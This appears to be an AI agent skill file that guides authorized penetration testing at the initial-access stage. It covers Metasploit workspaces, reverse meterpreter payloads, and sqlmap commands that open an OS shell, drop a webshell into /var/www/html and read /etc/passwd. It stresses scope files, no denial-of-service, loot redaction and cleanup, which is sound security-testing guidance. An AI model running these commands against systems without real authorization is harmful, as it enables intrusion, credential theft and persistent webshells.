---
name: pentest-initial-access
description: Use to turn a validated vulnerability into an actual foothold during an authorized penetration test. Consumes a qa-security exploit-validation proof as feedstock. Triggers "get a foothold from this validated vuln", "chain the confirmed SQLi into a shell". Not for proving a single vuln without chaining (`qa-security`), escalating (`pentest-privilege-escalation`), or scanning (`pentest-recon-enumeration`). Owned/lab only, under a committed scope file; production a separate gate.
---

# Penetration Testing — Initial Access / Exploitation (Metasploit · sqlmap · custom exploit)

Initial access is where a *detected-and-validated* weakness becomes a *foothold*: an interactive session on an in-scope host, obtained by chaining a proven vulnerability into code execution or access at network altitude. You do not re-discover vulns here — you take the proof `qa-security`'s `exploit-validation` produced (or a recon finding this engagement surfaced) and turn it into a session the next phases escalate from.

> **⚠️ Authorized self-testing only — owned/lab targets, under a committed scope file.** Gaining a foothold on a system is the most consequential act in the chain so far. You do it **only** against systems the engagement scope file names, **only** within the window, and **only** with techniques the scope file's "allowed techniques" list permits. Exploiting a machine you do not own or have written authorization to test is an intrusion, not a test. **Read the scope file before every act; if the next act would fall outside it — a target not listed, an exploit class not permitted, an out-of-scope host the exploit would touch — halt the run and report.** No exploit that risks availability (a memory-corruption exploit that may crash the service) runs against production without the separate, louder sign-off, and never as a technique whose goal is the crash.

```
Authorization: engagement=<NNN>  target=<in-scope host>  allowed-techniques=<list>
               authorized-by=<name>  window=<start>..<expiry>  environment=lab|production(2nd sign-off)
```

This skill is **language-agnostic** and is loaded by the **`penetration-tester`** agent in its **Exploitation** phase. It owns *gaining the foothold*; it does not *find* the surface (`pentest-recon-enumeration`), *prove a single vuln in isolation* (`qa-security` `exploit-validation` — its feedstock), or *escalate* the foothold (`pentest-privilege-escalation`).

## The boundary vs Stage-2 `exploit-validation` (sqlmap appears in both — draw it sharply)

Both this skill and `qa-security`'s `exploit-validation` use sqlmap. The line is the **altitude and goal**:

| | `qa-security` `exploit-validation` (Stage 2) | **this skill** `pentest-initial-access` (Stage 3) |
|---|---|---|
| Question | *Does this one detected vuln actually fire, and how far does it reach?* | *Can I chain a proven vuln into a foothold/session?* |
| sqlmap depth | Prove the injection + its blast radius: `--dump` a table, confirm the DB, redacted | **Gain a shell**: `--os-shell`, `--os-pwn`, `--file-write` a webshell, `--file-read` a credential file |
| Output | Proof-of-exploit + blast radius on *one app* | An interactive session on an *in-scope host* |
| Stops at | Single-vuln proof — no pivot, no escalation | The foothold — hands off to priv-esc/lateral |

**`exploit-validation` feeds `initial-access`.** A validated SQLi from Stage 2 is the input; this skill takes it from "the injection works" to "I have a shell." It does not itself re-validate — it consumes the proof and chains it.

> **Two spines, stated per finding.** Exploitation maps to **MITRE ATT&CK Enterprise** — `T1190` Exploit Public-Facing Application, `T1133` External Remote Services, `T1078` Valid Accounts (where access is via reused creds), `T1210` Exploitation of Remote Services (internal), `T1059` Command and Scripting Interpreter (the shell you land). The web/API weakness that gave access carries its **OWASP/WSTG** id (e.g. A03 Injection). Severity is scored **CVSS** in `pentest-reporting`, not the blocker/major/minor/nit table.

## Metasploit Framework — the exploitation engine

**Metasploit Framework** (Rapid7, open-source — the free Framework, distinct from the paid Pro; it is a **rolling release**, updated via `msfupdate` / the package manager, so pin the **Docker image digest or distro package version** your engagement uses rather than a semver, the same "deliberate, reviewable upgrade" discipline the scanners apply). It provides exploit modules, payloads, and post-exploitation, plus a workspace database that ingests your recon.

```bash
# Start with a workspace DB so recon + sessions are tracked (reproducible, and feeds the report).
msfconsole -q
msf6 > workspace -a engagement-<NNN>
msf6 > db_import nmap-example.xml           # ingest the recon phase's nmap -oA XML
msf6 > db_nmap -sV 10.0.10.5                 # or scan directly into the workspace

# The module taxonomy: exploit / auxiliary / payload / post / encoder / nop.
msf6 > search type:exploit name:<service/cve>
msf6 > use exploit/<path>
msf6 > info                                  # read what it does + its options BEFORE running
msf6 > set RHOSTS 10.0.10.5                   # the in-scope target ONLY
msf6 > set LHOST <your listener ip>           # your handler, inside the authorized env
msf6 > set PAYLOAD <payload>                  # e.g. a meterpreter reverse TLS payload
msf6 > check                                  # where supported: verify vulnerable WITHOUT firing
msf6 > exploit                                # fire — this is the act the scope file gates
msf6 > sessions -l                            # the foothold(s)
```

- **`check` before `exploit` where the module supports it** — it verifies the target is vulnerable without launching, the least-intrusive confirmation. Prefer it before an exploit that could destabilize the service.
- **`RHOSTS` is the in-scope target, `LHOST` is your handler inside the authorized environment.** A payload that calls back to anything outside the authorized env is out of bounds — this is the C2-containment rule applied at the foothold.
- **Resource scripts** (`msfconsole -r engagement.rc`) make a run reproducible and reviewable — the same set of `set`/`exploit` steps, replayable for a retest, and a record for the action log.
- **Payload choice matters for footprint:** a `meterpreter/*_tls` reverse payload is encrypted; a staged vs stageless choice affects detectability. Every session established is an artifact to enumerate and close at cleanup.
- **Exploit stability:** modules carry a `Rank` (Excellent → Low) and a reliability note. A memory-corruption exploit ranked below `Great` may crash the service — treat it as a potentially-disruptive act (scope-file opt-in, never blind against production).

## sqlmap at foothold altitude

Beyond proving the injection (Stage 2), sqlmap can escalate a SQL injection into OS access — the initial-access use:

```bash
# From a validated injection point, escalate toward a foothold:
sqlmap -u "https://app.example.com/item?id=1" --batch \
  --os-shell                        # interactive OS shell via the DBMS (where the DB user allows it)
# or:
sqlmap -u "..." --file-write local-webshell.php --file-dest /var/www/html/x.php   # drop a webshell
sqlmap -u "..." --file-read /etc/passwd     # read a target file (redact contents in the report)
sqlmap -u "..." --os-pwn                     # attempt Meterpreter/VNC via the DBMS (loud, opt-in)
```

- **Install (pinned):** sqlmap **1.10.7** (2026-07-07) — `git clone --depth 1 -b 1.10.7 https://github.com/sqlmapproject/sqlmap` or the pinned package. `--batch` runs non-interactively (deterministic for the action log).
- **`--os-shell`/`--os-pwn`/`--file-write` are foothold acts, not proof acts** — they are what distinguishes this skill from `exploit-validation`. Each requires the injection point already validated and the technique permitted by the scope file.
- **Loot redaction:** a `--file-read` that pulls `/etc/shadow` or a credential file, or a `--dump` of a users table, is reported as *that* it was accessible + its blast radius — never the contents.

## Custom exploitation — disciplined, never improvised from memory

When no module fits, a custom exploit (or a public PoC adapted to the target) is sometimes the path. The discipline:

- **Understand before you fire.** Read the PoC; know what it does to the target and whether it can crash it. An exploit you do not understand is not an authorized act — it is a gamble with someone's service.
- **Lab-first.** Reproduce a custom/PoC exploit against a lab replica before the authorized target where feasible; a reliability-unknown exploit against production is a disruption risk that needs its own opt-in.
- **No exploit whose *purpose* is a crash.** DoS is never a technique here. A memory-corruption exploit that *may* crash as a side effect is a disruptive act gated by the scope file and excluded from production by default.
- **Log the exact payload/command sent** — the custom exploit's inputs go verbatim into the action log for reproducibility and scope-accountability.

## The handoff — a foothold is where escalation begins

A session from this phase is the input to the next:

- **`pentest-privilege-escalation`** takes the foothold's user-level session and elevates it (SUID/sudo/kernel/token).
- **`pentest-lateral-movement`** takes the foothold as a pivot point into other in-scope hosts.
- **`pentest-credential-attacks`** harvests credentials from the foothold to reuse.

This skill stops at the foothold; it does not escalate or pivot itself.

## Anti-patterns

- **Firing an exploit without reading its rank/stability or running `check`.** A low-ranked memory-corruption module can crash the service. *Fix:* `info` + `check` first; treat sub-`Great` exploits as disruptive, scope-gated, never blind on production.
- **A payload `LHOST` pointing outside the authorized environment.** The callback leaves the scope — a C2-containment breach. *Fix:* the handler lives inside the authorized env; every session's transport stays in scope.
- **Using `--os-shell`/`--os-pwn` to "validate" a vuln.** That conflates the lanes and over-reaches proof. *Fix:* single-vuln proof is `exploit-validation`'s `--dump`-level job; foothold acts belong here, only on an already-validated injection.
- **Running a custom/PoC exploit you have not read.** *Fix:* understand it, lab-test it, know its crash risk before the authorized target.
- **Exfiltrating a file's contents into the report.** A `--file-read`/`--dump` result is loot. *Fix:* report *that* it was accessible + blast radius; never the contents; nothing sensitive under `docs/security/`.
- **Leaving the meterpreter session / webshell / workspace artifact behind.** *Fix:* every session, dropped webshell, and planted artifact is enumerated and removed at cleanup (per `pentest-post-exploitation` + `pentest-reporting`), the removal logged.
- **Treating a foothold as license to roam.** The foothold does not widen scope. *Fix:* the scope file still bounds every subsequent act; an out-of-scope host reachable from the foothold is out of scope.

## Rules (hard constraints)

- **The scope file gates every exploit.** Only in-scope targets, only permitted techniques, only within the window. Re-read it before each act; halt and report if the next act would exceed it.
- **`exploit-validation` is the feedstock, not re-done here.** Consume the Stage-2 single-vuln proof; take it to a foothold. Do not re-validate; do not stop at proof.
- **`check` before `exploit` where supported; understand every custom exploit before firing.** No exploit you cannot predict the effect of.
- **No DoS, ever** — not as a technique, not as an accepted side effect against production. A crash-risk exploit is scope-gated and excluded from production by default.
- **C2 containment:** the payload handler and every session transport stay inside the authorized environment; no callback egresses scope.
- **Production is a separate, louder gate than lab.** Default target is lab/throwaway; a foothold on production needs the second sign-off.
- **Two spines per finding:** ATT&CK Enterprise technique id + the OWASP/WSTG id of the weakness. Score CVSS in `pentest-reporting`.
- **Loot redaction + artifact cleanup.** File/DB contents are never in the report (blast radius only); every session/webshell/workspace artifact is removed at cleanup and the removal logged.
- **Log every act** — module/command, payload, target, timestamp, ATT&CK id — into the engagement action log as it runs.

## Cross-references

- **`penetration-tester`** — the orchestrator; runs this in its **Exploitation** phase, owns the scope-file gate.
- **`qa-security`** `exploit-validation` (`qa/_shared/security-testing/exploit-validation`) — the **feedstock**: proves *one* vuln fires + its blast radius, stops there. This skill chains that proof into a foothold. The single-vuln-proof vs foothold boundary is the whole reason both exist.
- **`pentest-recon-enumeration`** — the **prior** phase: supplies the live hosts, open ports, and services (and the nmap XML for `db_import`) this skill exploits.
- **`pentest-privilege-escalation`** · **`pentest-lateral-movement`** · **`pentest-credential-attacks`** — the **next** phases that build on the foothold.
- **`pentest-post-exploitation`** — owns the cleanup discipline for every session/artifact this phase creates.
- **`pentest-reporting`** — the action log (every exploit act) + CVSS/ATT&CK scoring of the access gained.
